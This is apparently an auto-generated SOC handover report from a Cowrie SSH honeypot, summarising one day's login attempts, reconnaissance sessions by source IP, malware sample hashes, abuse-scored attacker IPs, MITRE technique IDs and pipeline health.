### 🔴 HIGH · IR-6b2e551a9a90

| Field | Detail |
|---|---|
| **Source IP** | `154.221.19.37` |
| **First Seen** | 2026-03-09 18:17 |
| **Last Seen** | 2026-03-09 18:17 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-09 18:17:15` | `cowrie.session.connect` |
| `2026-03-09 18:17:15` | `cowrie.client.version` |
| `2026-03-09 18:17:43` | `cowrie.client.kex` |
| `2026-03-09 18:17:43` | `cowrie.login.success` |
| `2026-03-09 18:17:43` | `cowrie.session.params` |
| `2026-03-09 18:17:43` | `cowrie.command.input` |
| `2026-03-09 18:17:43` | `cowrie.log.closed` |
| `2026-03-09 18:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.19.37` to AbuseIPDB if not already reported
- [ ] Block `154.221.19.37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.38.35` | **25** | 2026-03-09 15:43 | 2026-03-09 15:48 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.41.71` | **20** | 2026-03-09 01:13 | 2026-03-09 01:17 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `59.5.190.226` | **18** | 2026-03-09 04:02 | 2026-03-09 04:07 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `120.48.181.192` | **11** | 2026-03-09 13:25 | 2026-03-09 13:43 | 18m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.123.173` | **10** | 2026-03-09 04:09 | 2026-03-09 04:31 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137.80` | **10** | 2026-03-09 10:28 | 2026-03-09 10:42 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `157.15.59.120` | **9** | 2026-03-09 06:26 | 2026-03-09 06:48 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `3.131.220.121` | **6** | 2026-03-09 05:49 | 2026-03-09 05:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `154.221.19.37` | **5** | 2026-03-09 18:11 | 2026-03-09 18:17 | 4m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.129.179` | **2** | 2026-03-09 03:47 | 2026-03-09 03:51 | 4m | 0 | `T1592` | 🟢 LOW |
| `112.164.20.69` | **2** | 2026-03-09 04:56 | 2026-03-09 04:56 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `112.53.99.37` | **2** | 2026-03-09 01:43 | 2026-03-09 01:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.92.15.204` | **2** | 2026-03-09 08:18 | 2026-03-09 08:21 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `170.64.177.28` | **2** | 2026-03-09 07:34 | 2026-03-09 07:36 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.174.200.225` | **2** | 2026-03-09 02:13 | 2026-03-09 02:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.38.149.140` | **2** | 2026-03-09 18:32 | 2026-03-09 18:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105.81` | **2** | 2026-03-09 17:45 | 2026-03-09 17:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.189.106.227` | **2** | 2026-03-09 02:49 | 2026-03-09 02:50 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `209.38.85.24` | **2** | 2026-03-09 15:35 | 2026-03-09 15:36 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.140.186.44` | **2** | 2026-03-09 09:24 | 2026-03-09 09:24 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `40.124.173.16` | **2** | 2026-03-09 03:38 | 2026-03-09 03:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.219.136.190` | **2** | 2026-03-09 18:12 | 2026-03-09 18:22 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `80.13.82.58` | **2** | 2026-03-09 04:50 | 2026-03-09 04:50 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.225.62.211` | 1 | 2026-03-09 09:42 | 2026-03-09 09:42 | 30s | 0 | `T1592` | 🟢 LOW |
| `101.200.236.207` | 1 | 2026-03-09 01:33 | 2026-03-09 01:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.88.137.213` | 1 | 2026-03-09 08:06 | 2026-03-09 08:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `110.38.211.186` | 1 | 2026-03-09 11:35 | 2026-03-09 11:35 | 14s | 0 | `T1592` | 🟢 LOW |
| `113.108.79.152` | 1 | 2026-03-09 02:35 | 2026-03-09 02:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.219.209.170` | 1 | 2026-03-09 10:31 | 2026-03-09 10:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.249.103.89` | 1 | 2026-03-09 01:48 | 2026-03-09 01:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.42.71.140` | 1 | 2026-03-09 04:48 | 2026-03-09 04:48 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.40.193.228` | 1 | 2026-03-09 17:58 | 2026-03-09 17:58 | 12s | 0 | `T1592` | 🟢 LOW |
| `120.1.61.81` | 1 | 2026-03-09 11:05 | 2026-03-09 11:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.175.69` | 1 | 2026-03-09 00:18 | 2026-03-09 00:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.29.225.50` | 1 | 2026-03-09 01:01 | 2026-03-09 01:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `13.218.248.210` | 1 | 2026-03-09 12:54 | 2026-03-09 12:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `150.246.249.149` | 1 | 2026-03-09 00:23 | 2026-03-09 00:24 | 31s | 0 | `T1592` | 🟢 LOW |
| `172.104.13.79` | 1 | 2026-03-09 04:58 | 2026-03-09 04:59 | 32s | 0 | `T1592` | 🟢 LOW |
| `177.75.49.5` | 1 | 2026-03-09 13:17 | 2026-03-09 13:17 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.184.86.82` | 1 | 2026-03-09 13:33 | 2026-03-09 13:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.250.89.44` | 1 | 2026-03-09 02:34 | 2026-03-09 02:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.39.72.50` | 1 | 2026-03-09 12:43 | 2026-03-09 12:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.74.84.36` | 1 | 2026-03-09 09:06 | 2026-03-09 09:07 | 31s | 0 | `T1592` | 🟢 LOW |
| `31.13.194.206` | 1 | 2026-03-09 02:53 | 2026-03-09 02:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `66.240.223.240` | 1 | 2026-03-09 05:01 | 2026-03-09 05:01 | 10s | 0 | `T1592` | 🟢 LOW |
| `78.181.19.18` | 1 | 2026-03-09 05:00 | 2026-03-09 05:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.94.95.221` | 1 | 2026-03-09 07:41 | 2026-03-09 07:41 | 2s | 0 | `T1592` | 🟢 LOW |
| `89.180.41.175` | 1 | 2026-03-09 06:10 | 2026-03-09 06:10 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (2 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.164.20.69` | KR | Korea Telecom | **100** ⚠️ | 28 |
| `206.189.106.227` | NL | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `13.218.248.210` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 32 |
| `113.108.79.152` | CN | CHINANET Guangdong province network | **100** ⚠️ | 2 |
| `4.17.226.146` | US | Level 3 Parent, LLC | **100** ⚠️ | 50 |
| `80.13.82.58` | FR | LNPUT657 Puteaux | **100** ⚠️ | 3 |
| `8.219.136.190` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 37 |
| `200.74.84.36` | CL | VTR BANDA ANCHA S.A. | **100** ⚠️ | 5 |
| `101.200.236.207` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `223.123.38.35` | PK | CMPak Limited | **100** ⚠️ | 34 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | — |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | — |
| [T1078](https://attack.mitre.org/techniques/T1078) | — |
| [T1083](https://attack.mitre.org/techniques/T1083) | — |
| [T1105](https://attack.mitre.org/techniques/T1105) | — |

---

## 🔕 False Positive Summary (258 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 182 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 9 |
| AbuseIPDB score 15 below threshold 25 | 8 |
| AbuseIPDB score 2 below threshold 25 | 4 |
| AbuseIPDB score 3 below threshold 25 | 6 |
| AbuseIPDB score 4 below threshold 25 | 15 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26 | Incident Timeline Generator | ✅ 456 session(s) |
| Tool 27 | Threat Intel Feeder         | ✅ 139 IP(s) enriched |
| Tool 29 | False Positive Tracker      | ✅ 258 filtered (56.6%) |
| Tool 30 | Metric Exporter             | ✅ stats.json written |
| Tool 31 | Malware Analyzer            | ✅ 2 file(s) analyzed |
| Tool 28 | SOC Handover Report         | ✅ This report |

> **Report grouping:** 31 priority case(s) shown individually · 48 recon entry/entries in table (23 group(s) consolidating 142 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-09T19:02:05Z_
